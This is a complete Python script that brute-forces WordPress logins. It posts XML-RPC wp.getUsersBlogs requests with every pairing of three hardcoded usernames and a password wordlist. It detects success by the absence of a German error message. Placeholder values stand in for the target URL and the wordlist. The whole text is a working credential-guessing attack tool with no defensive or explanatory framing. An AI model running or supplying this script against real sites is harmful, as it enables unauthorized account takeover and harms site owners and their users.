import itertools
import requests


TARGET_URL = 'http://yourhosthere/xmlrpc.php'


XML = '''
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
	<param>
		<value>
			<string>{username}</string>
		</value>
	</param>
	<param>
		<value>
			<string>{password}</string>
		</value>
	</param>
</params>
</methodCall>



'''

def wrap_creds_in_xml(username='', password=''):
	return XML.format(username=username, password=password)
	
def is_correct(text=''):
	constant = 'Benutzer oder Passwort falsch'
	return constant not in text

def get_passwords():
	with open('CHANGEYOURPASSWORDLIST') as file:
		text_as_string = file.read()
		return text_as_string.split('\n')

def main():
	users = ('masteramse', 'admin', 'markus', )
	passwords = get_passwords()
	
	for user, password in itertools.product(users, passwords):
		payload = wrap_creds_in_xml(username=user, password=password)
		response = requests.post(TARGET_URL, payload)
		correct = is_correct(text=response.text)
	
		if not correct:
			print('tried user "{}" pass"{}"'.format(user, password))
		else:
			print('----------FOUND IT!')
			print('USER: {}\nPASS:{}'.format(user, password))
			exit()
if __name__ == '__main__':
	main()
	